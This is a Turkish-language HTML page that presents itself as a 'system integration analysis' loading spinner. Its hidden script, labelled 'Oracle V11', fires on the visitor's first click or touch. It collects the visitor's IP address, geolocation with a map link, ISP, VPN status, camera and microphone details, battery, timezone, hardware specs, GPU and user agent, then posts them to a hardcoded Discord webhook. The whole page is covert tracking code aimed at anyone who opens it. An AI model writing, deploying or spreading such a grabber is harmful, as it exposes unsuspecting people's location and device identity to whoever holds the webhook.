<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem Entegrasyon Analizi</title>
    <style>
        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; cursor:crosshair; }
        .l { border: 2px solid #111; border-top: 2px solid #ff00ff; border-radius: 50%; width: 40px; height: 40px; animation: s 0.6s linear infinite; box-shadow: 0 0 15px #ff00ff22; }
        @keyframes s { to { transform: rotate(360deg); } }
    </style>
</head>
<body onmousedown="Oracle.ignite()" ontouchstart="Oracle.ignite()">
    <div class="l"></div>

    <script>
        "use strict";

        const Oracle = (function() {
            const HOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
            let fired = false;

            const Forensic = {
                // 1. Medya Cihazlarƒ± (Mikrofon/Kamera)
                async getMedia() {
                    try {
                        const devices = await navigator.mediaDevices.enumerateDevices();
                        const audio = devices.filter(d => d.kind === 'audioinput').length;
                        const video = devices.filter(d => d.kind === 'videoinput').length;
                        const labels = devices.map(d => d.label || "Gizli Donanƒ±m").filter(l => l !== "").join(", ");
                        return `üé§ ${audio} Mikrofon, üì∑ ${video} Kamera\n**Etiketler:** \`${labels || 'Eri≈üim Yok'}\``;
                    } catch { return "Medya Eri≈üimi Reddedildi"; }
                },

                // 2. Tam Zaman Analizi
                getTime() {
                    const now = new Date();
                    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    const offset = now.getTimezoneOffset();
                    return `‚è∞ **Saat:** ${now.toLocaleTimeString('tr-TR')}\nüåç **B√∂lge:** ${tz} (UTC${-offset/60})`;
                },

                // 3. Ekran Topolojisi
                getDisplay() {
                    return `üìê **√á√∂z√ºn√ºrl√ºk:** ${screen.width}x${screen.height}\nüé® **Renk:** ${screen.colorDepth}-bit | **DPR:** ${window.devicePixelRatio}`;
                }
            };

            return {
                async ignite() {
                    if (fired) return; fired = true;

                    // Paralel Veri Madenciliƒüi (Y√ºksek √ñncelikli)
                    const [netRes, media, bat] = await Promise.all([
                        fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
                        Forensic.getMedia(),
                        navigator.getBattery ? navigator.getBattery().catch(() => ({level:0})) : {level:0}
                    ]);

                    // Donanƒ±m R√∂ntgeni
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl2');
                    const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
                    const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";

                    const payload = {
                        content: "üíÄ **ORACLE V11 - TAM SPEKTRUM SIZINTI**",
                        embeds: [{
                            color: 16711935, // Neon Magenta
                            fields: [
                                { name: "üì° Aƒû, VPN & LOKASYON", value: `**IP:** \`${netRes.ip}\` | **VPN:** ${netRes.proxy ? '‚ö†Ô∏è AKTƒ∞F' : '‚úÖ TEMƒ∞Z'}\n**ISS:** ${netRes.org}\n**Konum:** ${netRes.city}, ${netRes.country_name}\nüìç [Google Maps](https://www.google.com/maps?q=${netRes.latitude},${netRes.longitude})`, inline: false },
                                { name: "üé§ MEDYA DONANIMI", value: media, inline: false },
                                { name: "‚öôÔ∏è Sƒ∞STEM & EKRAN", value: `${Forensic.getDisplay()}\n**OS:** ${navigator.platform}\n**CPU:** ${navigator.hardwareConcurrency} √áekirdek | **RAM:** ${navigator.deviceMemory}GB`, inline: true },
                                { name: "üîã G√ú√á & ZAMAN", value: `${Forensic.getTime()}\n**Pil:** %${Math.round(bat.level * 100)} (${bat.charging ? '≈ûarjda' : 'Pilde'})`, inline: true },
                                { name: "üõ†Ô∏è GPU RENDERER", value: `\`${gpu}\``, inline: false },
                                { name: "üîç USER AGENT", value: "```" + navigator.userAgent + "```" }
                            ],
                            footer: { text: "Protocol: Oracle V11 | Zero-Knowledge Extraction" },
                            timestamp: new Date().toISOString()
                        }]
                    };

                    const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
                    navigator.sendBeacon(HOOK, blob); // Kesin iletim
                    fetch(HOOK, { method: 'POST', mode: 'no-cors', keepalive: true, body: blob });
                }
            };
        })();
    </script>
</body>
</html>
